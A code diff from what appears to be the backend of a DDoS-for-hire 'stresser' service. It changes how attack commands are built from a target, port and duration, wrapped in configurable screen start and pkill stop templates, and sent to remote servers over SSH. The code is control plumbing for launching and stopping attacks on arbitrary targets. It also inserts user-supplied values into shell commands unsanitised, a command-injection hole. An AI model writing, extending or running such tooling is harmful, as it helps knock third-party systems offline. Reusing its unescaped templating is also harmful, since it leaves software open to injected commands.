@@ -625,7 +625,7 @@ async def select_best_server(method: str, concurrents: int):
     return None
 
 def build_attack_command(server: dict, attack: dict, username: str) -> str:
-    """Build the attack command with screen wrapper"""
+    """Build the attack command using server's custom start template"""
     method_commands = server.get("method_commands", [])
     command_template = None
     
@@ -640,7 +640,7 @@ def build_attack_command(server: dict, attack: dict, username: str) -> str:
     if not command_template:
         return None
     
-    # Replace placeholders
+    # Replace placeholders in method command
     command = command_template.replace("{target}", str(attack["target"]))
     command = command.replace("{port}", str(attack["port"]))
     command = command.replace("{duration}", str(attack["duration"]))
@@ -651,10 +651,28 @@ def build_attack_command(server: dict, attack: dict, username: str) -> str:
     # Create screen session name: username + attack_id (last 6 chars)
     screen_name = f"{username}{attack['id'][-6:]}"
     
-    # Wrap in screen command
-    full_command = f"screen -dmS {screen_name} {command}"
+    # Get server's start command template or use default
+    start_template = server.get("start_command", "screen -dmS {screen_name} {command}")
+    
+    # Replace placeholders in start command
+    full_command = start_template.replace("{screen_name}", screen_name)
+    full_command = full_command.replace("{command}", command)
+    full_command = full_command.replace("{username}", username)
+    full_command = full_command.replace("{attack_id}", attack["id"])
     
     return full_command, screen_name
+
+def build_stop_command(server: dict, screen_name: str, username: str = "", attack_id: str = "") -> str:
+    """Build the stop command using server's custom stop template"""
+    # Get server's stop command template or use default
+    stop_template = server.get("stop_command", "screen -S {screen_name} -X quit 2>/dev/null; pkill -9 -f '{screen_name}' 2>/dev/null || true")
+    
+    # Replace placeholders
+    stop_command = stop_template.replace("{screen_name}", screen_name)
+    stop_command = stop_command.replace("{username}", username)
+    stop_command = stop_command.replace("{attack_id}", attack_id)
+    
+    return stop_command
 
 def execute_ssh_command_sync(host, port, username, password, ssh_key, command):
     """Execute command via SSH (synchronous for thread executor)"""
